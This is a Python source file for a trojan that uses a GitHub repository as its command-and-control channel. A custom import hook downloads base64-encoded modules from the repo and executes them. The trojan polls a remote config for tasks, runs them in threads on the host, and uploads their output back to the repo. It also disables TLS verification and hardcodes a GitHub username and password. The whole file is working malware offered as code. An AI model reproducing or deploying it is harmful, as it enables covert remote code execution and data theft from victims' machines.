import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import requests
from os.path import join, abspath
from github3 import login

# os.environ["REQUESTS_CA_BUNDLE"] = "cacert.pem"
# requests.utils.DEFAULT_CA_BUNDLE_PATH = join(abspath('.'), 'cacert.pem')
os.environ["REQUESTS_CA_BUNDLE"] = join(abspath('.'), 'cacert.pem')
r = requests.get('https://api.github.com/', verify=False)

trojan_id = "omri"
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
configured = False
lastShas = []


class GitImporter(object):
    def __init__(self):

        self.current_module_code = ""

    def find_module(self, fullname, path=None):

        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname, False)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):

        module = imp.new_module(name)

        exec self.current_module_code in module.__dict__

        sys.modules[name] = module

        return module


def connect_to_github():
    gh = login(username="omriman067", password="a7xgxqe8")
    repo = gh.repository("omriman067", "chapter7")
    branch = repo.branch("master")

    return gh, repo, branch


def get_file_contents(filepath, isGettingConfig):
    gh, repo, branch = connect_to_github()

    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            if isGettingConfig and {filepath, filename._json_data['sha']} in lastShas:
                return ""
            print "[*] Found file %s" % filepath
            if isGettingConfig:
                lastShas.append({filepath, filename._json_data['sha']})
            blob = repo.blob(filename._json_data['sha'])

            return blob.content

    return None


def get_trojan_config():
    global configured

    config_json = get_file_contents(trojan_config, True)
    if config_json is None:
        config_json = get_file_contents("abc.json", True)
        gh, repo, branch = connect_to_github()
        remote_path = "config/%s.json" % trojan_id
        repo.create_file(remote_path, "new config file for %s" % trojan_id, base64.b64decode(config_json))
    if config_json is "":
        return
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:
            exec ("import %s" % task['module'])

    return config


def store_module_result(module, data):
    gh, repo, branch = connect_to_github()

    remote_path = "data/%s/%s%d.data" % (trojan_id, str(module) + "-", random.randint(1000, 100000))

    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(module, result)

    return


# main trojan loop
sys.meta_path = [GitImporter()]
def main_func():
    while True:

        if task_queue.empty():

            config = get_trojan_config()

            if config is not None:
                for task in config:
                    t = threading.Thread(target=module_runner, args=(task['module'],))
                    t.start()
                    time.sleep(random.randint(1, 10))

        time.sleep(random.randint(5, 10))

main_thread = threading.Thread(target=main_func)
main_thread.start()
